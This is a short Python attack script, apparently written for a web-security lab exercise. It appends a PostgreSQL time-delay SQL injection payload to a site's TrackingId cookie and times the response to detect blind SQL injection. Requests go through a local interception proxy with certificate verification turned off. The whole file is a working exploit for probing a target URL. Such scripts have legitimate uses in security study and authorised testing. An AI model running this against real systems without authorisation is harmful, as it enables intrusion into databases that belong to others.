import requests
from requests import cookies
from requests.sessions import Session
import urllib3
import urllib
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def get_tracking_id(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    return s.cookies.get_dict()

def cause_delay(s,url,dict_cookies):
    sql_payload = "|| (SELECT pg_sleep(10))--"
    sql_payload_encode = urllib.parse.quote(sql_payload)
    # print(dict_cookies)
    trackingId = dict_cookies['TrackingId']
    dict_cookies['TrackingId'] = trackingId+sql_payload_encode
    print(dict_cookies)
    r = s.get(url, cookies=dict_cookies,verify=False, proxies=proxies)
    print(s.cookies.get_dict())
    if int(r.elapsed.total_seconds())>=10:
        print("[+] SQL vulnerable to time delays")
    else:
        print("[-] SQL not vulnerable to time delays")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    cookies_dict = get_tracking_id(s, url)
    trackingId = cookies_dict['TrackingId']
    cause_delay(s,url,cookies_dict)